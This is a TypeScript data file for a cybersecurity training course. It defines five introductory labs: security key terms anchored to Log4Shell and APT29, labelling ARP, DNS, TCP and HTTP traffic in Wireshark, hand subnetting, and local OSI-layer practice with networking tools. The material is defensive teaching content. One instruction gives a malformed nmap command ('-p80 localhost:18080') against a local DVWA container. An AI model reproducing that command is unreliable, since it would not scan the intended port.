import type { Lab } from "@/types"
export const LABS: Lab[] = [
  {
    id: "L01",
    number: 1,
    week: 1,
    moduleId: "m1",
    title: "Key Terms Self-Check Quiz",
    description:
      "Log4Shell (CVE-2021-44228) is the example this lab keeps coming back to: a vulnerability whose CVSS score, CWE-502 lineage, and blast radius you need to be able to state cold, not look up mid-incident. This lab drills the six terms every later module assumes you already know — CIA Triad, CVE, CWE, IOC, APT, Zero-Day — by pairing each with a real, current example: Log4Shell's CVSS score and CWE-502 lineage, IOC types SOC analysts hunt against MITRE ATT&CK technique T1059, two TTPs attributed to APT29, and how Stuxnet or EternalBlue were eventually caught. You finish able to produce a crisp, example-backed definition for each term on demand — in an interview, on a call, or in an incident write-up — instead of just recognizing it in a list.",
    objective:
      "Write an example-backed, one-sentence definition of the CIA Triad, CVE, CWE, IOC, APT, and Zero-Day from memory, each anchored to a real case, and check them against the Module 1 Glossary.",
    successCriteria: [
      "All six terms (CIA Triad, CVE, CWE, IOC, APT, Zero-Day) have a written one-sentence definition",
      "Each definition is paired with a specific real-world example (a named CVE ID like CVE-2021-44228, a named APT group, etc.)",
      "A note confirms every definition was checked against the glossary and corrected",
      "The six definitions plus examples are saved as one portfolio note file",
    ],
    platform: "Self / Notion",
    difficulty: "easy",
    estimatedHours: 1,
    instructions: [
      `Without looking at the Glossary, write a one-sentence definition from memory for each of: CIA Triad, CVE, CWE, IOC, APT, Zero-Day`,
      `For CVE: look up one real CVE on cve.org (e.g. CVE-2021-44228, Log4Shell) and note its affected product, its CWE category, and its CVSS score`,
      `For CWE: find that CVE's linked CWE entry on cwe.mitre.org/top25 and explain in one sentence what class of bug it represents (e.g. CWE-502, deserialization of untrusted data)`,
      `For IOC: using MITRE ATT&CK (attack.mitre.org) as reference, list 3 concrete IOC types a SOC analyst would hunt for in a SIEM for one technique (e.g. T1059 command execution) — a hash, an IP, a registry key`,
      `For APT: pick one real APT group tracked in MITRE ATT&CK (e.g. APT29) and list two TTPs officially attributed to it`,
      `For Zero-Day: find one historical zero-day (e.g. Stuxnet, EternalBlue) and note how it was eventually discovered or patched`,
      `Check all six definitions against the Module 1 Glossary tab and correct any vague or wrong wording`,
      `Explain each term out loud, in your own words, to another person or a recorded voice memo — if you stumble, rewrite that definition until you don't`,
      `Save your six definitions plus six real-world examples as one note file for your training portfolio`,
    ],
    resources: [
      {
        title: "CVE Program (cve.org)",
        url: "https://www.cve.org",
        type: "link",
      },
      {
        title: "CWE Top 25 Most Dangerous Software Weaknesses",
        url: "https://cwe.mitre.org/top25/",
        type: "link",
      },
      { title: "MITRE ATT&CK", url: "https://attack.mitre.org", type: "link" },
      {
        title: "NIST NICE Framework Glossary of Terms",
        url: "https://www.nist.gov/itl/applied-cybersecurity/nice/nice-framework-resource-center/nice-framework-glossary-terms",
        type: "link",
      },
      {
        title: "Professor Messer Security+ SY0-701 (free video course)",
        url: "https://www.professormesser.com/sy0-701-certification-course/",
        type: "video",
      },
    ],
    completionIndicator: `A screenshot or exported note file showing all 6 written definitions (CIA Triad, CVE, CWE, IOC, APT, Zero-Day), each paired with a specific real-world example (a named CVE ID, a named APT group, etc.), with a line confirming the answers were checked against the glossary.`,
    slides: [
      {
        title: "Recall all six terms from memory",
        body: "Before touching any reference, write a one-sentence definition from memory for each of CIA Triad, CVE, CWE, IOC, APT, and Zero-Day — this forces active recall instead of glossary recognition.",
      },
      {
        title: "Anchor CVE and CWE to a real vulnerability",
        body: "Look up a real CVE on cve.org (e.g. CVE-2021-44228, Log4Shell), noting its affected product and CVSS score, then find its linked CWE entry on cwe.mitre.org/top25 and explain in one sentence what class of bug it represents.",
        diagram: {
          type: "browser-mockup",
          url: "cve.org/CVERecord?id=CVE-2021-44228",
          annotations: [
            {
              label: "Affected product",
              note: "Apache Log4j2",
            },
            {
              label: "CVSS score",
              note: "10.0 Critical",
            },
            {
              label: "Linked CWE",
              note: "CWE-502: Deserialization of Untrusted Data",
            },
          ],
        },
      },
      {
        title: "Ground IOC and APT in MITRE ATT&CK",
        body: "Using MITRE ATT&CK as reference, list 3 concrete IOC types a SOC analyst would hunt for in a SIEM for one technique (e.g. T1059 command execution) — a hash, an IP, a registry key — then pick a real APT group (e.g. APT29) and list two TTPs officially attributed to it.",
        diagram: {
          type: "graph-tree",
          nodes: [
            {
              id: "t1059",
              label: "T1059: Command Execution",
              highlighted: true,
            },
            {
              id: "hash",
              label: "IOC: file hash",
            },
            {
              id: "ip",
              label: "IOC: C2 IP address",
            },
            {
              id: "reg",
              label: "IOC: registry key",
            },
            {
              id: "apt29",
              label: "APT29",
              highlighted: true,
            },
            {
              id: "ttp1",
              label: "TTP: spear-phishing attachment",
            },
            {
              id: "ttp2",
              label: "TTP: living-off-the-land binaries",
            },
          ],
          edges: [
            {
              from: "t1059",
              to: "hash",
            },
            {
              from: "t1059",
              to: "ip",
            },
            {
              from: "t1059",
              to: "reg",
            },
            {
              from: "apt29",
              to: "ttp1",
            },
            {
              from: "apt29",
              to: "ttp2",
            },
          ],
        },
      },
      {
        title: "Find a historical zero-day",
        body: "For Zero-Day, find one historical example such as Stuxnet or EternalBlue and note how it was eventually discovered or patched.",
      },
      {
        title: "Stress-test and lock in your definitions",
        body: "Check all six definitions against the Module 1 Glossary and correct any vague or wrong wording, then explain each term out loud — to another person or a recorded voice memo — and rewrite any definition you stumble on until you don't.",
      },
      {
        title: "Save your six worked definitions",
        body: "Save your six definitions plus their six real-world examples as one note file for your training portfolio.",
      },
      {
        title: "Why this matters",
        body: "Being able to produce a crisp, example-backed definition of the CIA Triad, CVE, CWE, IOC, APT, and Zero-Day on the spot — not just recognize them in a list — is what separates a candidate who sounds prepared in an interview from one who visibly stalls. Every later module in this program assumes you can use these six terms correctly without pausing to look them up.",
      },
    ],
    hints: [
      "If a definition isn't coming easily, try writing whichever of the six terms you're most confident about first, then work through the rest in the same order the lab lists them.",
      "For CVE and CWE, anchor your answer to the lab's own example — CVE-2021-44228 (Log4Shell) on cve.org — and trace its linked CWE entry on cwe.mitre.org/top25.",
      "For IOC and APT, use MITRE ATT&CK: list the IOC types (a hash, an IP, a registry key) tied to technique T1059, and the two TTPs attributed to APT29.",
      "Still stuck on Zero-Day? Look specifically at Stuxnet or EternalBlue and note how each was eventually discovered or patched — that's the exact example the lab points you toward.",
    ],
  },
  {
    id: "L02",
    number: 2,
    week: 1,
    moduleId: "m1",
    title: "Portal Orientation: Foundations Walkthrough (start)",
    description:
      "Every later Module 2 and 3 lab assumes you can already read a client-server exchange and drive a Linux terminal without hand-holding — trainees who skip that foundation are consistently the ones who stall out once labs stop explaining themselves. This lab tours the portal's own Module 0 (hardware fundamentals), Module 1 (cybersecurity fundamentals — CIA Triad, CVE, CWE, IOC, APT, Zero-Day), and Module 2 (networking) material, then has you complete this course's own local intro labs — L01's Key Terms quiz, L03's Wireshark capture, L04's subnet calculator, and L05's local networking practice — end to end, entirely in-house, with nothing external to sign up for. You come out with the baseline networking vocabulary (MAC address, DHCP, DNS, the request/response cycle) and command-line muscle memory the rest of the program is built on top of.",
    objective:
      "Read through the portal's own Module 0-2 foundations and complete this course's own intro labs — L01, L03, L04, and L05 — end to end, entirely in-house.",
    successCriteria: [
      "Module 0, Module 1, and Module 2 content read start to finish in the portal, with the six Module 1 key terms (CIA Triad, CVE, CWE, IOC, APT, Zero-Day) noted",
      "L01 (Key Terms Self-Check Quiz) completed, with its six example-backed definitions saved",
      "L03 (Wireshark) and L04 (Subnet Calculator) completed, with each lab's own evidence saved",
      "L05 (local networking practice) completed, with a real protocol or device mapped to at least one OSI layer",
    ],
    platform: "In-House Portal",
    difficulty: "easy",
    estimatedHours: 4,
    instructions: [
      `Open the portal's Modules tab and read Module 0 (hardware fundamentals: CPU, RAM, ROM, storage, BIOS/UEFI) start to finish`,
      `Read Module 1 (cybersecurity fundamentals), noting the six terms every later module assumes you already know: CIA Triad, CVE, CWE, IOC, APT, Zero-Day`,
      `Complete L01 (Key Terms Self-Check Quiz) to turn those six terms into your own example-backed definitions, checked against the Module 1 glossary`,
      `Read Module 2 (OSI Model, TCP/IP, IP addressing, ports/protocols, MAC/ARP, switches/routers/firewalls, VPNs, NAT)`,
      `Complete L03 (Wireshark: Capture & Label Traffic by OSI Layer) to see the client-server request/response cycle in traffic you captured yourself`,
      `Complete L04 (Subnet Calculator Exercise) to hand-calculate network/broadcast addresses and usable host ranges`,
      `Complete L05 (local networking practice) to map real local tools and protocols to the OSI layers covered in Module 2`,
      `Write a short note connecting all four intro labs back to their Module 0-2 material, and save it alongside each lab's own evidence`,
    ],
    resources: [
      {
        title: "Module 0: Foundations",
        url: "/modules/m0",
        type: "link",
      },
      {
        title: "Module 1: Cybersecurity Fundamentals",
        url: "/modules/m1",
        type: "link",
      },
      {
        title: "Module 2: Networking",
        url: "/modules/m2",
        type: "link",
      },
      {
        title: "This course's labs (L01, L03, L04, L05)",
        url: "/labs",
        type: "link",
      },
      {
        title: "TryHackMe Pre Security path (optional extra practice)",
        url: "https://tryhackme.com/path/outline/presecurity",
        type: "platform",
      },
    ],
    completionIndicator: `Module 0-2 read through in the portal, plus each intro lab's own completion evidence saved: L01's six definitions, L03's labeled capture.pcapng, L04's worked subnet worksheet, and L05's OSI-layer mapping notes.`,
    slides: [
      {
        title: "Start with Module 0 and Module 1",
        body: "Open the portal's Modules tab and read Module 0 (hardware fundamentals) start to finish, then read Module 1 (cybersecurity fundamentals), noting the six terms every later module assumes you already know.",
      },
      {
        title: "Lock in the six key terms with L01",
        body: "Complete L01 (Key Terms Self-Check Quiz): write an example-backed, one-sentence definition for CIA Triad, CVE, CWE, IOC, APT, and Zero-Day, then check every one against the Module 1 glossary.",
      },
      {
        title: "Trace the client-server request/response cycle",
        body: "Read Module 2's networking material, then complete L03 (Wireshark) to see a browser's request and a server's response together make up the full request/response cycle in traffic you captured yourself.",
        diagram: {
          type: "request-response",
          leftLabel: "Browser",
          rightLabel: "Web Server",
          exchanges: [
            {
              direction: "right",
              label: "GET / HTTP/1.1",
            },
            {
              direction: "left",
              label: "HTTP/1.1 200 OK",
              payload: "<html>...</html>",
            },
          ],
        },
      },
      {
        title: "Hand-calculate subnets with L04",
        body: "Complete L04 (Subnet Calculator Exercise): work out the network address, broadcast address, and usable host range for each assigned CIDR by hand, then verify every answer against an online calculator.",
      },
      {
        title: "Tie it together with L05's local networking practice",
        body: "Complete L05: use local tools (ip/ifconfig, ping, traceroute, netstat/ss, nmap) to map a real protocol or device to each OSI layer from Module 2, on your own machine, with nothing external required.",
        diagram: {
          type: "network-topology",
          nodes: [
            {
              id: "you",
              label: "You (laptop)",
              kind: "device",
            },
            {
              id: "gw",
              label: "Local router/gateway",
              kind: "router",
            },
          ],
          edges: [
            {
              from: "you",
              to: "gw",
              label: "ip / ping / traceroute / ss",
            },
          ],
        },
      },
      {
        title: "Capture your evidence",
        body: "Save each intro lab's own evidence as you go — L01's definitions, L03's capture.pcapng, L04's worksheet, L05's OSI mapping — plus a short note tying all four back to their Module 0-2 material.",
      },
      {
        title: "What you just proved",
        body: "You can now read a request/response cycle, name the basic building blocks of a network, and operate a Linux terminal by typing real commands instead of reading about them. That baseline is exactly what every later Module 2 and 3 lab assumes you walk in with — skip it and you stall the moment a lab stops explaining itself.",
      },
    ],
    hints: [
      "If you're not sure where to start, work top to bottom: Module 0, Module 1 plus L01, Module 2, then L03, L04, and L05 in order.",
      "Not sure what a step wants from you? Module 1 plus L01 is about the six key terms, Module 2 plus L03/L05 is about the client-server request/response cycle and OSI layers, and L04 is subnet math.",
      "Don't skip a step if it stumps you — the answer is usually explained directly in that module's own material just before the related lab asks for it.",
      "Remember your evidence: Module 0-2 read through, plus each of L01/L03/L04/L05's own completion indicator saved.",
    ],
  },
  {
    id: "L03",
    number: 3,
    week: 2,
    moduleId: "m2",
    title: "Wireshark: Capture & Label Traffic by OSI Layer",
    description:
      "Real network traffic analysis and incident response run on the same three patterns you'll capture here: the ARP broadcast/unicast-reply exchange, the TCP SYN/SYN-ACK/ACK three-way handshake, and a plaintext HTTP request/response — the exact traffic SOC analysts sift through to catch leaked credentials, DNS tunneling, and C2 beaconing. This lab has you capture live traffic in Wireshark, break it down in Statistics > Protocol Hierarchy, then use display filters to isolate and label each of those three patterns and map them back onto the OSI model, right down to following the raw plaintext of an HTTP GET over TCP Stream. An optional extra pass against a real malware pcap from Malware-Traffic-Analysis.net pushes the same filters into an actual investigative context. You walk away able to read a raw packet capture confidently — a hard requirement for any SOC or network security role.",
    objective:
      "Capture live traffic in Wireshark and use display filters to isolate and label an ARP exchange, a DNS query/response, the TCP three-way handshake, and an HTTP GET, mapping each back to its OSI layer.",
    successCriteria: [
      "Statistics > Protocol Hierarchy shows the captured protocol breakdown",
      "The ARP pair, DNS pair, TCP SYN/SYN-ACK/ACK handshake, and one http.request are isolated and labeled in the packet list",
      "The HTTP GET's plaintext request/response viewed via Follow > TCP Stream",
      "The capture is saved as capture.pcapng and submitted with the labeled packet list",
    ],
    platform: "Wireshark",
    difficulty: "easy",
    estimatedHours: 2,
    instructions: [
      "Download and install Wireshark from wireshark.org/download.html, keeping the Npcap driver installation enabled",
      "Start a live capture on your active Wi-Fi or Ethernet interface",
      "Generate traffic: visit a non-HTTPS site (e.g. http://neverssl.com), run 'ping 8.8.8.8' in a terminal, and run 'nslookup example.com'",
      "Stop the capture, then open Statistics > Protocol Hierarchy to see the percentage breakdown of every protocol you captured",
      "Use the display filter bar to isolate and label: one arp packet pair (the broadcast 'who has this IP?' request followed by the unicast reply, exactly as covered in the MAC/ARP topic), one dns query/response pair, the three packets of tcp.flags.syn==1 (SYN, SYN-ACK, ACK — the same handshake covered in the TCP/UDP and URL-flow topics), and one http.request",
      "Right-click the HTTP GET request packet -> Follow -> TCP Stream to view the full plaintext request and response, and compare it against the GET / HTTP/1.1 request and HTTP/1.1 200 OK response format from the URL-flow topic",
      "For extra practice, download one real pcap from Malware-Traffic-Analysis.net's training exercises page and use the same filters to find the suspicious traffic",
      "Save your own capture as capture.pcapng and submit it alongside your labeled packet list",
    ],
    resources: [
      {
        title: "Wireshark download",
        url: "https://www.wireshark.org/download.html",
        type: "tool",
      },
      {
        title: "Wireshark User's Guide",
        url: "https://www.wireshark.org/docs/wsug_html_chunked/",
        type: "link",
      },
      {
        title: "Wireshark Display Filter Reference",
        url: "https://www.wireshark.org/docs/dfref/",
        type: "link",
      },
      {
        title: "Wireshark with Chris Greer (free YouTube playlist)",
        url: "https://www.youtube.com/playlist?list=PLhfrWIlLOoKO8522T1OAhR5Bb2mD6Qy_l",
        type: "video",
      },
      {
        title: "Malware-Traffic-Analysis.net training exercises",
        url: "https://www.malware-traffic-analysis.net/training-exercises.html",
        type: "platform",
      },
    ],
    completionIndicator: `Screenshot of the Wireshark window showing the Protocol Hierarchy statistics plus the packet list with the labeled ARP, DNS, TCP 3-way handshake, and HTTP GET packets visible, alongside the saved .pcapng capture file.`,
    slides: [
      {
        title: "Install Wireshark and Npcap",
        body: "Download and install Wireshark from wireshark.org/download.html, keeping the Npcap driver installation enabled — Npcap is what lets Wireshark actually capture on your live interface.",
      },
      {
        title: "Generate traffic across multiple layers",
        body: "Start a live capture on your active Wi-Fi or Ethernet interface, then generate a deliberate mix of traffic: visit the plaintext site http://neverssl.com, run 'ping 8.8.8.8', and run 'nslookup example.com'.",
        diagram: {
          type: "terminal",
          prompt: "you@laptop:~$",
          lines: [
            {
              command: "ping 8.8.8.8",
            },
            {
              command: "nslookup example.com",
            },
          ],
        },
      },
      {
        title: "Read the Protocol Hierarchy breakdown",
        body: "Stop the capture, then open Statistics > Protocol Hierarchy to see the percentage breakdown of every protocol you actually captured.",
      },
      {
        title: "Isolate and label each protocol pair",
        body: "Use the display filter bar to pull out one arp broadcast/unicast-reply pair, one dns query/response pair, the three tcp.flags.syn==1 handshake packets (SYN, SYN-ACK, ACK), and one http.request.",
        diagram: {
          type: "packet-capture",
          rows: [
            {
              time: "0.0000",
              source: "Dell_ab:cd:ef",
              dest: "Broadcast",
              protocol: "ARP",
              info: "Who has 192.168.1.1? Tell 192.168.1.42",
              highlighted: true,
            },
            {
              time: "0.0012",
              source: "192.168.1.1",
              dest: "192.168.1.42",
              protocol: "ARP",
              info: "192.168.1.1 is at aa:bb:cc:dd:ee:ff",
              highlighted: true,
            },
            {
              time: "1.2045",
              source: "192.168.1.42",
              dest: "8.8.8.8",
              protocol: "DNS",
              info: "Standard query A example.com",
            },
            {
              time: "1.2389",
              source: "8.8.8.8",
              dest: "192.168.1.42",
              protocol: "DNS",
              info: "Standard query response A 93.184.216.34",
            },
            {
              time: "2.0011",
              source: "192.168.1.42",
              dest: "34.223.124.45",
              protocol: "TCP",
              info: "SYN Seq=0",
              highlighted: true,
            },
            {
              time: "2.0453",
              source: "34.223.124.45",
              dest: "192.168.1.42",
              protocol: "TCP",
              info: "SYN, ACK Seq=0 Ack=1",
              highlighted: true,
            },
            {
              time: "2.0458",
              source: "192.168.1.42",
              dest: "34.223.124.45",
              protocol: "TCP",
              info: "ACK Seq=1 Ack=1",
              highlighted: true,
            },
            {
              time: "2.0502",
              source: "192.168.1.42",
              dest: "34.223.124.45",
              protocol: "HTTP",
              info: "GET / HTTP/1.1",
              highlighted: true,
            },
          ],
        },
      },
      {
        title: "Map each packet back to its OSI layer",
        body: "Line up what you just isolated against the OSI stack — ARP resolving MAC addresses at Layer 2, IP addressing wrapping every packet at Layer 3, the TCP three-way handshake and DNS over UDP at Layer 4, and the HTTP GET/response at Layer 7 — exactly as covered in the M2 module's MAC/ARP and URL-flow topics.",
        diagram: {
          type: "layer-stack",
          layers: [
            {
              label: "L2 - Data Link (ARP)",
              detail:
                "broadcast who-has / unicast reply resolves an IP to a MAC address",
              highlighted: true,
            },
            {
              label: "L3 - Network (IP)",
              detail:
                "source/destination addressing wrapping every packet you captured",
            },
            {
              label: "L4 - Transport (TCP/UDP)",
              detail:
                "SYN / SYN-ACK / ACK three-way handshake, plus the DNS query/response over UDP",
              highlighted: true,
            },
            {
              label: "L7 - Application (HTTP)",
              detail:
                "plaintext GET / HTTP/1.1 request and HTTP/1.1 200 OK response",
              highlighted: true,
            },
          ],
        },
      },
      {
        title: "Follow the HTTP stream and save your evidence",
        body: "Right-click the HTTP GET packet -> Follow -> TCP Stream to view the full plaintext request and response, compare it against the GET / HTTP/1.1 format from the URL-flow topic, then save your capture as capture.pcapng.",
        diagram: {
          type: "request-response",
          leftLabel: "Your browser",
          rightLabel: "neverssl.com",
          exchanges: [
            {
              direction: "right",
              label: "GET / HTTP/1.1",
            },
            {
              direction: "left",
              label: "HTTP/1.1 200 OK",
              payload: "plaintext HTML body",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "The ARP exchange, TCP three-way handshake, and plaintext HTTP request/response you just labeled are the same three patterns SOC analysts and incident responders scan for constantly, to catch leaked credentials, DNS tunneling, and C2 beaconing. You can now open a raw packet capture and confidently map what you see back to the OSI layer it belongs to, a core requirement for any SOC or network security role.",
      },
    ],
    hints: [
      "If you're missing a traffic type, revisit what you generated — visiting a plaintext site, a ping, and an nslookup are what produce the ARP, DNS, TCP, and HTTP patterns you need.",
      "To isolate each pattern, use the specific display filters: arp, dns, tcp.flags.syn==1 for the handshake, and http.request for the GET.",
      "Can't spot the ARP exchange? Look for the broadcast 'who has this IP?' request followed immediately by its unicast reply.",
      "To see the plaintext HTTP content, right-click the http.request packet and choose Follow -> TCP Stream.",
    ],
  },
  {
    id: "L04",
    number: 4,
    week: 2,
    moduleId: "m2",
    title: "Subnet Calculator Exercise",
    description:
      "Subnetting math shows up in almost every entry-level IT/security interview, and it's what lets you read a firewall rule, a VLAN design, or a routing table on the spot, without reaching for a calculator you might not have during a live assessment. This lab has you hand-calculate the network address, broadcast address, and usable host range for five CIDR blocks — from a tight /30 point-to-point link to a /22 — first modeling the method against the module's own worked example of splitting 192.168.1.0/24 into four /26 subnets, then verifying every answer against an online calculator and diagnosing any mismatch by redoing the math step by step. You finish with subnetting math you can do cold, plus a one-line realistic use case for each block size.",
    objective:
      "Hand-calculate the network address, broadcast address, and usable host range for five given CIDR blocks, then verify every answer against an online subnet calculator.",
    successCriteria: [
      "Network address, broadcast address, and usable host range worked out by hand for all 5 CIDRs, with working shown",
      "Each answer confirmed matching against the subnettingpractice.com calculator",
      "At least one CIDR re-derived step-by-step to locate any logic error",
      "One realistic use case written per CIDR",
    ],
    platform: "Manual / Online",
    difficulty: "easy",
    estimatedHours: 1,
    instructions: [
      "Write down the 5 CIDRs: 192.168.1.0/26, 10.0.0.0/22, 172.16.5.0/28, 192.168.100.0/25, 10.10.10.0/30",
      "Before calculating your own 5 CIDRs, work through the module's own reference example once: 192.168.1.0/24 split into four /26 subnets of 64 addresses each (192.168.1.0/26 hosts .1-.62, .64/26 hosts .65-.126, .128/26 hosts .129-.190, .192/26 hosts .193-.254) — use this as the model for how the block-size method works before applying it to your harder CIDRs",
      "For each, calculate host bits = 32 - prefix, then total addresses = 2^(host bits)",
      "Calculate usable hosts = total addresses - 2 (one address reserved for network, one for broadcast)",
      "Find the block size / increment (256 - the relevant octet's subnet mask value) to locate where each CIDR's boundary falls",
      "Work out the network address (first address in the block) and broadcast address (last address) for each CIDR, showing your working",
      "Verify all 5 answers using the subnettingpractice.com subnet calculator, flagging any mismatches",
      "For any mismatch (or, if none, pick one CIDR at random), redo the manual math step-by-step to find exactly where your own logic went wrong",
      "Write one sentence per CIDR describing a realistic use case (e.g. a /30 for a point-to-point router link, a /26 for a small office VLAN)",
    ],
    resources: [
      {
        title: "Subnetting Practice — subnet calculator",
        url: "https://subnettingpractice.com/subnet-calculator.html",
        type: "tool",
      },
      {
        title: "Subnetting Practice — practice questions",
        url: "https://subnettingpractice.com/",
        type: "platform",
      },
      {
        title: "Professor Messer: Seven-Second Subnetting (Network+ N10-009)",
        url: "https://www.professormesser.com/network-plus/n10-009/n10-009-video/seven-second-subnetting-n10-009/",
        type: "video",
      },
      {
        title: "subnetting.net practice tool",
        url: "https://www.subnetting.net/",
        type: "tool",
      },
    ],
    completionIndicator: `A worksheet or screenshot showing all 5 CIDRs with hand-calculated network address, broadcast address, and usable host range, plus a screenshot of the subnettingpractice.com calculator confirming each answer matches.`,
    slides: [
      {
        title: "Write down the five CIDRs",
        body: "Write down the 5 CIDRs you'll be hand-calculating: 192.168.1.0/26, 10.0.0.0/22, 172.16.5.0/28, 192.168.100.0/25, 10.10.10.0/30.",
      },
      {
        title: "Work the module's reference example first",
        body: "Before your own 5 CIDRs, redo the module's own reference split of 192.168.1.0/24 into four /26 subnets of 64 addresses each — use this as the model for how the block-size method works.",
        diagram: {
          type: "terminal",
          prompt: "subnet-math$",
          lines: [
            {
              command: "# 192.168.1.0/24 split into four /26 subnets",
            },
            {
              output: "192.168.1.0/26    hosts .1-.62",
            },
            {
              output: "192.168.1.64/26   hosts .65-.126",
            },
            {
              output: "192.168.1.128/26  hosts .129-.190",
            },
            {
              output: "192.168.1.192/26  hosts .193-.254",
            },
          ],
        },
      },
      {
        title: "Calculate host bits and usable hosts",
        body: "For each CIDR, calculate host bits = 32 - prefix, total addresses = 2^(host bits), then usable hosts = total addresses - 2 (one address reserved for network, one for broadcast).",
      },
      {
        title: "Find the block size and the network/broadcast boundaries",
        body: "Find the block size / increment (256 - the relevant octet's subnet mask value) to locate where each CIDR's boundary falls, then work out the network address (first) and broadcast address (last) for each, showing your working.",
      },
      {
        title: "Verify against the calculator and fix mismatches",
        body: "Verify all 5 answers using the subnettingpractice.com subnet calculator, flag any mismatches, then redo the manual math step-by-step for at least one CIDR (a mismatch, or a random one if none) to find exactly where your logic went wrong.",
      },
      {
        title: "Tie each subnet to a real use case",
        body: "Write one sentence per CIDR describing a realistic use case — e.g. a /30 for a point-to-point router link, a /26 for a small office VLAN.",
      },
      {
        title: "Why this matters",
        body: "You can now derive a network address, broadcast address, and usable host range from a bare CIDR notation by hand — the exact skill tested in almost every entry-level IT/security interview, and what lets you read firewall rules, VLAN designs, and routing tables without a calculator on hand.",
      },
    ],
    hints: [
      "Stuck on where to begin? Redo the lab's own worked example first — splitting 192.168.1.0/24 into four /26 subnets — before applying the method to your 5 assigned CIDRs.",
      "Remember the formula: host bits = 32 - prefix, then total addresses = 2^(host bits); usable hosts is that total minus 2.",
      "To find the network and broadcast boundaries, use the block size / increment — 256 minus the relevant octet's subnet mask value.",
      "If the calculator flags a mismatch, redo that one CIDR from scratch, checking your host-bits, total-addresses, and block-size numbers one at a time against subnettingpractice.com.",
    ],
  },
  {
    id: "L05",
    number: 5,
    week: 2,
    moduleId: "m2",
    title: "Local Networking Practice: OSI Layers with Real Tools",
    description:
      "OSI layers, LAN topologies, encapsulation, and port forwarding stop being theory the moment you have to troubleshoot a real network — this lab turns that M2 material into hands-on practice with nothing but the tools already on your machine, instead of passive reading. You use ip/ifconfig, ping, traceroute, netstat/ss, and nmap (the same scanner driven against a local target in L18) to observe your own interface configuration, trace a route hop by hop, inspect active connections, and scan a local host — mapping a real protocol or device to each of the seven OSI layers and tracing how encapsulation adds a header at every layer going down the stack. Capturing your own traffic in Wireshark alongside at least one exercise ties the theory directly to a packet you generated yourself. You leave able to explain how a LAN, a router, and a VPN tunnel actually move a request end to end.",
    objective:
      "Use local command-line tools (ip/ifconfig, ping, traceroute, netstat/ss, nmap) to map a real protocol or device to each OSI layer and tie the theory to a packet you capture yourself in Wireshark.",
    successCriteria: [
      "Terminal output captured for each of the 5 exercises (interface config, ping/traceroute, netstat/ss, OSI-layer mapping, local nmap scan)",
      "One real protocol or device recorded for each of the 7 OSI layers",
      "Own traffic captured in Wireshark alongside at least one exercise",
    ],
    platform: "Local Tools",
    difficulty: "easy",
    estimatedHours: 4,
    instructions: [
      `Open Module 2 (Networking) in the portal and keep it open as a reference alongside each exercise below`,
      `Interface configuration: run ip a (Linux) or ifconfig (macOS) or ipconfig /all (Windows) and record your own IP address, subnet mask, and default gateway`,
      `Path tracing: run traceroute 8.8.8.8 (Linux/macOS) or tracert 8.8.8.8 (Windows) and note each hop, then run ping -c 4 8.8.8.8 (or ping -n 4 on Windows) and note the round-trip times`,
      `Active connections: run netstat -tulpn or ss -tulpn (Linux) or netstat -ano (Windows) and record at least 3 active or listening connections, noting the local port and remote address for each`,
      `OSI Model: for each of the 7 layers, write down one real protocol or device that operates there, drawing on what ip/ping/traceroute/netstat just showed you (e.g. ARP at L2, IP at L3, TCP/UDP at L4, HTTP/DNS at L7)`,
      `Encapsulation: note how the traceroute/ping traffic you just generated adds a header at each layer going down the stack, from raw application data to the frame that leaves your NIC`,
      `Start the DVWA lab from L18 (Start Lab button, dockerImage ghcr.io/digininja/dvwa:latest, containerPort 80) and run nmap -sV -p80 localhost:18080 against it to see a live local port forwarded from a container, then note this in the context of firewalls, port forwarding, and NAT`,
      `For at least one exercise, capture your own traffic in Wireshark alongside the command you ran to connect the theory to a real packet`,
      `Save your terminal output for each of the 5 exercises as evidence`,
    ],
    resources: [
      {
        title: "Module 2: Networking",
        url: "/modules/m2",
        type: "link",
      },
      {
        title: "L18: Nmap local scan lab",
        url: "/labs",
        type: "link",
      },
      {
        title: "Wireshark User's Guide",
        url: "https://www.wireshark.org/docs/wsug_html_chunked/",
        type: "link",
      },
      {
        title:
          "TryHackMe Network Fundamentals room series (optional extra practice)",
        url: "https://tryhackme.com/module/network-fundamentals",
        type: "platform",
      },
    ],
    completionIndicator: `Five saved terminal outputs — interface config, ping/traceroute, netstat/ss, the OSI-layer-to-protocol mapping, and the local nmap scan against localhost:18080 — plus at least one Wireshark capture tying an exercise to a real packet.`,
    slides: [
      {
        title: "Open Module 2 as your reference",
        body: "Open Module 2 (Networking) in the portal and keep it open as a reference alongside each hands-on exercise below.",
      },
      {
        title: "Read your own interface configuration",
        body: "Run ip a (Linux), ifconfig (macOS), or ipconfig /all (Windows) and record your own IP address, subnet mask, and default gateway.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "ip a",
            },
            {
              output: "inet 192.168.1.42/24 ... default via 192.168.1.1",
            },
          ],
        },
      },
      {
        title: "Trace the path and time the round trip",
        body: "Run traceroute 8.8.8.8 (tracert on Windows) and note each hop, then run ping -c 4 8.8.8.8 and note the round-trip times.",
        diagram: {
          type: "network-topology",
          nodes: [
            {
              id: "pcA",
              label: "Your machine",
              kind: "device",
            },
            {
              id: "switch",
              label: "Local gateway",
              kind: "router",
            },
            {
              id: "pcB",
              label: "8.8.8.8",
              kind: "server",
            },
          ],
          edges: [
            {
              from: "pcA",
              to: "switch",
              label: "hop 1",
            },
            {
              from: "switch",
              to: "pcB",
              label: "hop 2+",
            },
          ],
        },
      },
      {
        title: "Inspect your active connections",
        body: "Run netstat -tulpn or ss -tulpn (Linux) or netstat -ano (Windows), and record at least 3 active or listening connections, noting the local port and remote address for each.",
      },
      {
        title: "OSI Model: one protocol per layer",
        body: "For each of the 7 layers, write down one real protocol or device that operates there, drawing directly on what ip/ping/traceroute/netstat just showed you.",
        diagram: {
          type: "layer-stack",
          layers: [
            {
              label: "L7 Application",
              detail: "HTTP, DNS",
            },
            {
              label: "L6 Presentation",
              detail: "TLS/SSL encoding",
            },
            {
              label: "L5 Session",
              detail: "session establishment/teardown",
            },
            {
              label: "L4 Transport",
              detail: "TCP, UDP",
            },
            {
              label: "L3 Network",
              detail: "IP, routers",
            },
            {
              label: "L2 Data Link",
              detail: "MAC addressing, switches",
            },
            {
              label: "L1 Physical",
              detail: "cabling, NICs",
            },
          ],
        },
      },
      {
        title: "Encapsulation down the stack",
        body: "Look at the ping/traceroute traffic you just generated and note how encapsulation adds a header at each layer going down the stack.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Data",
              detail: "application payload",
            },
            {
              label: "Segment",
              detail: "transport header added (TCP/UDP)",
